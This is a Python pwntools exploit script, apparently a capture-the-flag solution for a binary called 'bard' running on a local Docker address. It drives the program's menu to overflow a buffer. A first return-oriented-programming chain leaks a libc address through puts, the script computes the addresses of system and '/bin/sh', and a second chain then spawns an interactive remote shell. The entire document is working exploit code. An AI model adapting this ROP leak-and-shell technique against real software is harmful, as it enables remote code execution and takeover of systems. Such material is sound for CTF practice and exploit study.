from pwn import *

remote_ip = '172.17.0.2'
port = '9001'
elf = ELF("bard")
libc = ELF("libc-2.27.so")
r = remote(remote_ip, port)
#r = process([elf.path])


def good(weapon, name):
    r.sendlineafter(":\n", 'g')
    r.sendlineafter("cy\n", str(weapon))
    r.sendafter("name:\n", name)


def evil(weapon, name):
    r.sendlineafter(":\n", 'e')
    r.sendlineafter("ent\n", str(weapon))
    r.sendafter("name:\n", name)


def sheriff():
    r.sendlineafter("do?\n", 'e')


def zombie(inp):
    r.sendlineafter("do?\n", inp)


def trigger(payload):
    for i in range(1):
        good(1, b"A" * 8)
    for i in range(8):
        evil(1, b"B" * 8)

    good(1, payload)

    for i in range(1):
        zombie('r')

    for i in range(8):
        sheriff()

    for i in range(1):
        zombie('r')


# gadgets
puts = 0x4006d0
pop_rdi = 0x401143
main = 0x40107b
ret = 0x4006ae

# good -> 48 bytes
# bad  -> 56 bytes
payload = p64(pop_rdi)
payload += p64(0x602020)
payload += p64(puts)
payload += p64(main)
trigger(payload)

r.recvuntil("away.")
r.recvline()
leak = r.recv(6)
leak = u64(leak + b'\x00\x00') - 0x80a30
system = leak + 0x4f4e0
binsh = leak + 0x1b40fa

log.info("libc_base --> %s " % hex(leak))
log.info("system --> %s" % hex(system))
log.info("/bin/sh --> %s" % hex(binsh))

payload = p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
trigger(payload)

r.interactive()
